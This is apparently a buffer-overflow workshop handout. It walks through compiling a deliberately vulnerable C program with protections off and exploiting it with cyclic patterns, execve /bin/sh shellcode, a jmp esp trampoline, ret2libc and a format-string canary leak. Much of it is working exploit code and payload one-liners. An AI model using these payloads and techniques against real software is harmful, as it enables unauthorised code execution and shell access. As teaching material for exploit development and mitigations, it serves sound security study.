# Buffer Overflows 2025
## Parker Garrison

```
To get started
	Clone the visual demo
		git clone https://github.com/parkergarrison/visualoverflow
		
	You will need the files: segment_mem.c, wisdom.c, runescape.sh, pat_gen.py, pat_ind.py
		git clone https://github.com/parkergarrison/overflow
		cd overflow
	
	Download a cross-compiler for 32-bit binaries.
		sudo apt-get install gcc-multilib
	
	
	Download and install gef
		wget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/py
		echo source ~/.gdbinit-gef.py >> ~/.gdbinit
		
		Formerly we used Python Exploit Development Assistance, but it is no longer updated.
		gdb-peda to execute some of the gdb commands such as checksec:
			git clone https://github.com/longld/peda.git ~/peda
			echo "source ~/peda/peda.py" >> ~/.gdbinit
	
	Download ROPgadget for one of the challenges:
		git clone https://github.com/JonathanSalwan/ROPgadget.git

Memory and the Stack
	Ensure ASLR is off
		echo 0 >| /proc/sys/kernel/randomize_va_space
		
		Alternative: Turn off ASLR and run just one program:
			setarch $(uname -m) -R $(pwd)/filename.out # replace with actual full path to file
	
	Compile segment_mem.c
		gcc -m32 segment_mem.c -o segment_mem
	
	Run this binary to examine addresses which are in various memory segments:
		./segment_mem
			Address in .text: 0804848b

			Address of etext: 08048678
			Address in .data: 08048680
			Address in .data: 08049958

			Address of edata: 0804995c
			Address in .bss: 08049964

			Address of end: 08049968
			Address in heap: 0804a008

			...

			Address in stack: bfb76968
			Address in stack: bfb7696e
	
	Examining the impact of ASLR
		Run it again
			Which addresses changed?
			
		Turn on ASLR and try again
			echo 1 | sudo tee /proc/sys/kernel/randomize_va_space
			Or as root -- echo 1 >| /proc/sys/kernel/randomize_va_space # note the space after '1'!
		
		Turn off ASLR and try again
			echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
	
		
Exploit Mitigations and Bypasses
	Exercise 0: No Mitigations
		Compile wisdom-basic.c without NX
			gcc -m32 wisdom-basic.c -g -fno-stack-protector -z execstack -o wisdom_e0.out -std=c99
			# Old standard allows extremely vulnerable "gets" function to be used
		
		Turn off ASLR
			echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
		
		Run the program
			./wisdom_e0.out
		
		Debug the program
			gdb -p $(pgrep wisdom_e0) # only works if there is exactly 1 instance running
		
		Generate a cyclic pattern of length 300
			chmod +x ./pat_gen.py
			./pat_gen.py 300
		
		Compute the offset of the start of the pattern to saved value of EIP
			chmod +x ./pat_ind.py
			python ./pat_ind.py [hexdigits]
		
		Display functions in the program
			(gdb) info functions
		
		Print the address of shell function
			(gdb) print shell
		
		Print escaped attack code to call shell function
			#0x56556271
			python2 -c 'print "A"*152 + r"\x71\x62\x55\x56"'
			# Should do this with struct.pack when running without runescape.sh, to avoid typos

		Execute program while escaping input
			chmod +x runescape.sh
			./runescape.sh ./wisdom_e0.out
		
		Ensure that pgrep will find the correct process
			ps -ef | grep wisdom
			
		Attach to gdb
			gdb -p $(pgrep wisdom)
		
		Detach from gdb
			(gdb) detach
	
	Exercise 1: No mitigations, no shell function
		There are a few differences from above.
		
		Compile wisdom.c without NX
			gcc wisdom.c -g -fno-stack-protector -z execstack -o wisdom_e1.out
		
		Generate a pattern to use as input and compute the offset to saved EIP
			./pat_gen.py 300
			python ./pat_ind.py [hexdigits]
		
		Find the location of esp
			gdb-peda$ info registers esp
			(shortcut: i r esp)
			0xffffc990
			
		Look on the stack to see where the A's start, and write the exploit within that constraint
			
			python2 -c 'print r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*(152 - 23) + r"\xe4\xca\xff\xff"'
			
			cat flag # It worked!
		
			
	Exercise 2: Bypass ASLR, no NX with Trampoline
		Compile wisdom_e2.c without NX
			gcc wisdom_e2.c -g -fno-stack-protector -z execstack -o wisdom_e2.out
		
		Find useful ESP gadgets
			gdb-peda$ jmpcall -r esp
			gdb-peda$ jmpcall
		
		Now we get to turn on and bypass a mitigation! Turn on ASLR.
		
		/bin/sh Shellcode from exploit-db in escaped format
			\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
			
		Print escaped ASLR bypass exploit code
			Python file: 
				sc = r"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
				nops = r"\x90" * 16
				addr =  r"\x8f\x8b\x04\x08" # This address contains a jmp esp
				
				print "A"*152 + addr + nops + sc
				
	
	Exercise 3: Bypass NX with ret2libc
		
		Find address of "/bin/bash" string compiled into program
			Automatic using tool
				git clone https://github.com/JonathanSalwan/ROPgadget.git
				python ./ROPgadget/ROPgadget.py --binary ~/binexp/wisdom.out --string "/bin/bash"
					Strings information
					============================================================
					0x08048a20 : /bin/bash
		
			Alternative
				gdb> print wisdoms[1]
					$1 = 0x8048a08 "A great shell to use is /bin/bash"
				gdb> print wisdoms[1]+24
					$2 = 0x8048a20 "/bin/bash"
			
		Examine memory location as a string
			gdb-peda$ x/s 0x8048a20
				0x8048a20:	 "/bin/bash"
			
		
		Find addresses of functions
			All functions matching regular expression "system@plt":

			Non-debugging symbols:
			0x08048570  system@plt

			gdb-peda$ p system
				$1 = {<text variable, no debug info>} 0xb7e503e0 <system>
			gdb-peda$ p exit
				$2 = {<text variable, no debug info>} 0xb7e431b0 <exit>
				
		Recompile wisdom.c with NX and no stack canaries
			gcc wisdom.c -g -fno-stack-protector -o wisdom_e3.out
			chmod +x runescape.sh
			./runescape.sh wisdom.out-nx
		
		Print escaped NX bypass exploit code (file: exploit_e3_plt.py)
			Python file:
				addr_system_esc = r"\xe0\x03\xe5\xb7"
				addr_exit_esc = r"\xb0\x31\xe4\xb7" # If we do this right, our exploit doesn't even crash the target, and is less detectable!
				args = r"\x20\x8a\x04\x08"
				
				print "A"*152 + addr_system_esc + addr_exit_esc + args
	
	Exercise 4: Stack Canaries, with NX and ASLR
		Recompile wisdom.c with Stack Canaries
			gcc wisdom.c -g -fstack-protector -o wisdom_e4.out
		
		Print program input which will leak a canary when interpreted as a format string but is not too long for the buffer
			python -c 'print "%x " * 40'
		
		Python code to print escaped Stack Canary exploit code
				#!/usr/bin/python
				import sys
				
				# Exploit Linux randomized null terminator canaries with 2 buffers
				
				def lp(s, n):
					return "0"*(n-len(s))+s

				def reverse_and_escape(hexstring):
					return "".join([r"\x"+hexstring[2*i:2*i+2] for i in range(int(len(hexstring)/2))][::-1])


				''' Exploit parameters '''
				canary_hex_little = sys.argv[1]
				eip_offset_1 = 34*4
				eip_offset_2 = 34*4
				eip_hex_str = "804876c"


				eip_escaped = reverse_and_escape(eip_hex_str.zfill(8))
				canary_offset_1 = eip_offset_1 - 8
				print "A"*canary_offset_1+"B"+reverse_and_escape(canary_hex_little)[1*4:]+"CCCC"*3+eip_escaped # 'B' instead of the first null byte

				canary_offset_2 = eip_offset_2 - 8
				print "A"*canary_offset_2 # implicit "\x00" will be written
		
		Run the file:
			python exploit_e4_canaryleak.py [canaryhex]
```

